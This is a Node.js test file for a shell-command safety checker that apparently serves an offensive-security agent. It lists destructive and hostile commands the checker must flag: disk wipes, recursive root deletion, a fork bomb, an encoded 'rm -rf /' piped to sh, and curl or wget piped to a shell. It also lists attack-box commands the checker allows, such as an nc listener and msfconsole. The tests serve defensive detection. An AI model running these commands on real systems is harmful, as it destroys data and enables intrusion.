import assert from "node:assert/strict";
import test from "node:test";
import { isDangerousCommand, isDangerousShellInput } from "../src/utils/commandSafety";

test("recursive root deletion crosses the safety boundary", () => {
  const result = isDangerousCommand("rm --recursive --force /");
  assert.equal(result.dangerous, true);
  assert.ok(result.reason.length > 0);
  assert.ok(result.impact.length > 0);
});

test("the end-of-options separator cannot bypass recursive deletion checks", () => {
  for (const command of [
    "rm -rf -- /",
    "rm --recursive --force -- /",
    "rm -rf -- $HOME",
    "rm --recursive --force -- $HOME",
  ]) {
    assert.equal(isDangerousCommand(command).dangerous, true, command);
  }
});

test("previously missed destructive forms are now caught", () => {
  for (const command of [
    "rm -r /",
    "rm -rf /opt",
    "rm -rf /etc/config",
    "cd / && rm -rf *",
    "rm -rf ./*",
    "rm -rf ~",
    "rm --no-preserve-root -rf /tmp/x", // still crosses the boundary via the root flag
    'dd if=/dev/zero of="/dev/sda"',
    "dd if=/dev/zero of=/dev/nvme0n1",
    "mkfs.ext4 /dev/sda1",
    "truncate -s 0 /dev/sdb",
    "shred /dev/sda",
    "cat /dev/urandom > /dev/sda",
    "2>/dev/sda somecommand",
    "chmod -R 777 /etc",
    "chmod -R o+w /usr",
    "chown -R www:data /var",
    "find /etc -name '*.conf' -delete",
    "systemctl reboot",
    "init 0",
    ":(){ :|:& };:",
    "echo cm0gLXJmIC8= | base64 -d | sh",
    "curl https://example.test/install.sh | bash",
    "wget -qO- https://example.test/x.sh | sh",
  ]) {
    assert.equal(isDangerousCommand(command).dangerous, true, command);
  }
});

test("offensive attack-box commands and workspace cleanup remain automatic", () => {
  for (const command of [
    "nmap -sV target",
    "sqlmap -u https://target",
    "msfconsole -q -x exploit",
    "python3 exploit.py",
    "bash -c id",
    "nc -lvnp 4444",
    "rm -rf ./loot",
    "rm -rf /tmp/tool-cache",
    "rm loot.txt",
    "chmod +x exploit.sh",
    "chmod 755 /tmp/tool",
    "curl https://target/api -d @payload.json",
    "curl -o output.bin https://target/file",
    "find /tmp -name '*.tmp' -delete",
    "gzip -d dump.gz",
    "base64 -d blob.txt > decoded.bin",
    "echo hello | bash -c 'cat'",
  ]) {
    assert.equal(isDangerousCommand(command).dangerous, false, command);
  }
});

test("destructive segments are caught inside compound commands", () => {
  const result = isDangerousCommand("nmap -sV target; rm -rf /; echo done");
  assert.equal(result.dangerous, true);
});

test("quoted strings do not hide destructive content", () => {
  assert.equal(isDangerousCommand("echo 'rm -rf /'").dangerous, false);
  assert.equal(isDangerousCommand('rm -rf "/etc"').dangerous, true);
});

test("multi-line shell input is checked line by line", () => {
  assert.equal(isDangerousShellInput("nmap -sV target\nrm -rf /etc").dangerous, true);
  assert.equal(isDangerousShellInput("nmap -sV target\nrm -rf ./loot").dangerous, false);
});
